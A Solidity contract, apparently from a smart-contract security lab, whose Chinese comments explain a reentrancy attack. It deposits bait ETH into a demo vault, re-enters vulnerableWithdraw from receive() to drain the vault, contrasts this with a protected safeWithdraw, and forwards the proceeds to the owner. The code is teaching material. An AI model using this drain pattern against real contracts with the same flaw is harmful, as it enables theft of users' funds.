//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

//接口：IVault（与金库交互的“菜单”）
interface IVault {
    function deposit() external payable;
    function vulnerableWithdraw() external;
    function safeWithdraw() external;
}

contract GoldThief {

    //存储目标金库合约地址（并把它当作 IVault）
    IVault public targetVault;

    //记录部署此攻击合约的地址（操作者）
    //合约的敏感操作（发起攻击、提取战利品）仅允许 owner 执行
    address public owner;

    //计数器，用于记录 receive() 被触发的次数（即重入次数）
    //主要用于给攻击设置上限，防止无限循环或耗尽 gas
    uint public attackCount;

    //标志当前是否在“攻击安全版本”（true）还是“攻击易受攻击版本”（false）
    //receive() 根据该标志决定下一步重入行为
    bool public attackingSafe;

    //构造函数：初始化目标与所有者
    //部署 GoldThief 时必须传入目标 Vault 的地址 _vaultAddress
    constructor(address _vaultAddress) {

        //将地址转换为 IVault 类型，之后可直接调用接口里的函数
        //（等于告诉“合约”这就是我要攻击的金库）
        targetVault = IVault(_vaultAddress);

        //部署者设为 owner，控制权限
        owner = msg.sender;
    }
    
    //attackVulnerable() — 发起易受攻击版的攻击
    function attackVulnerable() external payable {

        //仅允许部署者（owner）调用，防止他人触发攻击合约
        require(msg.sender == owner, "Only owner");

        //调用时需随交易至少发送 1 ETH。该 ETH 是“诱饵”
        //——先存在目标 Vault 的映射中，作为合法可提现的余额
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");

        //设置攻击模式为“攻击 vulnerable”（而非 safe），并重置重入计数器
        attackingSafe = false;
        attackCount = 0;

        //把发送的 ETH 存入目标 Vault，形成可提现的余额（像正常用户一样）
        targetVault.deposit{value: msg.value}();

        //调用金库的 vulnerableWithdraw()
        //由于该函数在发 ETH 之后才把余额设为 0（不安全顺序）
        //当金库向本合约发 ETH 时会触发本合约的 receive() 回调
        //回调会再次调用 vulnerableWithdraw()
        //从而形成重入循环并多次提现同一余额（直至次数上限或 vault 资金耗尽）
        targetVault.vulnerableWithdraw();
    }
    //PsPs：这是标准的“先外部交互再修改状态”的漏洞利用模式
    //—— 利用被害合约在外部调用前未更新状态的逻辑缺陷进行重入

    //attackSafe() — 尝试攻击安全版本（通常会失败）
    function attackSafe() external payable {

        //权限检查：只有 owner（合约部署者）可以调用此函数
        require(msg.sender == owner, "Only owner");

        //要求调用时至少附带 1 ETH
        //这笔 ETH 是“诱饵”：攻击合约会把它存进目标 Vault（deposit）
        //从而在 Vault 的内部 goldBalance 映射中产生一笔可提取余额
        require(msg.value >= 1 ether, "Need at least 1 ETH");

        //将状态标志 attackingSafe 设为 true
        //表示当前是在“攻击安全版本（safeWithdraw）”的模式
        attackingSafe = true;

        //把重入计数器 attackCount 清零，作为重入尝试次数的初始值
        attackCount = 0;

        //向目标 Vault 合约调用 deposit() 并把 msg.value（调用 attackSafe() 时发送的 ETH）一并传过去
        //这个外部调用会把钱实际存入目标 Vault，并在 Vault 的内部状态为攻击合约记录相应的余额
        targetVault.deposit{value: msg.value}();

        //紧接着调用目标 Vault 的 safeWithdraw()。这是实际“触发提取并测试重入防御”的关键步骤
        targetVault.safeWithdraw();
    }

    //receive() — 攻击的核心：回调/重入逻辑
    //当合约接收到 ETH（比如目标金库在 withdraw() 中发送 ETH）时
    //Solidity 会自动执行这个函数（如果存在）
    //这是攻击链中每次收到钱时被触发的“钩子”
    receive() external payable {

        //每次进入 receive() 都自增计数器
        //限制重入次数（这里示例上限是 <5）
        //避免无限循环或耗尽 gas
        attackCount++;

        //!attackingSafe：确保这是在攻击易受攻击版本的流程中
        //address(targetVault).balance >= 1 ether：检查目标合约是否还有足够的 ETH 可供继续偷取（示例阈值 1 ETH）
        //attackCount < 5：限制最多重入 4 次（因先 ++ 之后检查小于 5）
        if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {

            //若条件满足，回调内再次调用
            //vulnerableWithdraw()，这就是重入 —— 因为目标合约尚未把攻击者余额清零
            //仍认为攻击者有余额可取，继续向攻击合约发 ETH
            //触发 receive()，循环进行
            targetVault.vulnerableWithdraw();
        }

        //如果当前为“攻击 safe 模式”
        //则在收到 ETH 后尝试再次调用 safeWithdraw()
        //不过因为 safeWithdraw() 有 nonReentrant（或先清零余额）
        //这一再入将会失败并 revert，从而阻止攻击
        if (attackingSafe) {
            targetVault.safeWithdraw(); 
        }
    }
    //PsPs：攻击循环示意
    //vulnerableWithdraw() → 金库发 ETH → 本合约 receive() 被触发 → receive() 再调用 vulnerableWithdraw() → （重复）

    //stealLoot() — 把偷到的钱转走
    //仅允许 owner 调用，将攻击合约当前持有的全部 ETH 通过 transfer 发回 owner
    function stealLoot() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }

    //getBalance() — 查询攻击合约余额
    //只读函数，返回 GoldThief 合约当前持有的 ETH 数量，方便外部查看已从目标合约吸出的金额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

